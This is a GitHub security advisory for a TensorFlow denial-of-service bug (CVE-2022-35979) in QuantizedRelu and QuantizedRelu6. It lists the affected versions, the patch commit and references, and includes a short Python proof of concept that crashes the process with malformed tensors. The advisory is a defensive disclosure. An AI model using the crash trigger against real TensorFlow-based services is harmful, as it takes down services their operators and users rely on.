# [M] TensorFlow vulnerable to segfault in `QuantizedRelu` and `QuantizedRelu6`

## Summary
Severity: Medium
Advisory: GHSA-v7vw-577f-vp8x
CVE: CVE-2022-35979
CWE: CWE-20
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:N/A:H (CVSS_V3)
Published: 2022-09-16
Source: https://github.com/advisories/GHSA-v7vw-577f-vp8x
Type: github-advisory

## Affected
- PyPI: `tensorflow` — affected >=0 <2.7.2
- PyPI: `tensorflow` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-cpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-cpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-cpu` — affected >=2.9.0 <2.9.1
- PyPI: `tensorflow-gpu` — affected >=0 <2.7.2
- PyPI: `tensorflow-gpu` — affected >=2.8.0 <2.8.1
- PyPI: `tensorflow-gpu` — affected >=2.9.0 <2.9.1

## Details
### Impact
If `QuantizedRelu` or `QuantizedRelu6` are given nonscalar inputs for `min_features` or `max_features`, it results in a segfault that can be used to trigger a denial of service attack.
```python
import tensorflow as tf

out_type = tf.quint8
features = tf.constant(28, shape=[4,2], dtype=tf.quint8)
min_features = tf.constant([], shape=[0], dtype=tf.float32)
max_features = tf.constant(-128, shape=[1], dtype=tf.float32)
tf.raw_ops.QuantizedRelu(features=features, min_features=min_features, max_features=max_features, out_type=out_type)
tf.raw_ops.QuantizedRelu6(features=features, min_features=min_features, max_features=max_features, out_type=out_type)
```

### Patches
We have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).

The fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.


### For more information
Please consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.


### Attribution
This vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.

## References
- https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v7vw-577f-vp8x
- https://nvd.nist.gov/vuln/detail/CVE-2022-35979
- https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89
- https://github.com/tensorflow/tensorflow
- https://github.com/tensorflow/tensorflow/releases/tag/v2.10.0
